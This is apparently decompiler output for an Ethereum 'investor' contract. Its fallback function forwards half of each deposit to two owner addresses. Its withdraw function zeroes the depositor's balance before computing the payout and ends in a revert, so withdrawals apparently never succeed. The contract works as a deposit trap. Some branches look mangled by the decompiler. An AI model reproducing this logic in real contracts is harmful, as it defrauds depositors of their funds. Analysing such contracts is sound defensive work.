contract main {


// =======================  Init code  ======================


address stor0;
address stor1;

function _fallback() payable {
    stor1 = 0x158c0d4aed433deca376b33c7e90b07933fc5cd3
    require not msg.value
    stor0 = msg.sender
    return code.data[97 len 822]
}



// =====================  Runtime code  =====================


address owner;
address owner2;
mapping of uint256 investorAmount;
mapping of uint256 investorDate;

function investorAmount(address arg1) {
    return investorAmount[arg1]
}

function owner2() {
    return owner2
}

function owner() {
    return owner
}

function investorDate(address arg1) {
    return investorDate[arg1]
}

function _fallback() payable {
    investorAmount[address(msg.sender)] += msg.value
    investorDate[address(msg.sender)] = block.timestamp
    call owner with:
       value 485 * investorAmount[address(msg.sender)] / 1000 wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
    call owner2 with:
       value 15 * investorAmount[address(msg.sender)] / 1000 wei
         gas 2300 * is_zero(value) wei
}

function withdraw() {
    require investorAmount[address(msg.sender)]
    require block.timestamp >= investorDate[address(msg.sender)] + (168 * 24 * 3600)
    investorAmount[address(msg.sender)] = 0
    if eth.balance(this.address) >= investorAmount[address(msg.sender)] + (10 * block.timestamp - investorDate[address(msg.sender)] / 168 * 24 * 3600 * investorAmount[address(msg.sender)] / 100):
        call msg.sender with:
           value investorAmount[address(msg.sender)] + (10 * block.timestamp - investorDate[address(msg.sender)] / 168 * 24 * 3600 * investorAmount[address(msg.sender)] / 100) wei
             gas 2300 * is_zero(value) wei
        if ext_call.success:
        call owner with:
           value investorAmount[address(msg.sender)] + (10 * block.timestamp - investorDate[address(msg.sender)] / 168 * 24 * 3600 * investorAmount[address(msg.sender)] / 100) wei
             gas 2300 * is_zero(value) wei
    else:
        call msg.sender with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
        if ext_call.success:
        call owner with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
    revert
}



}
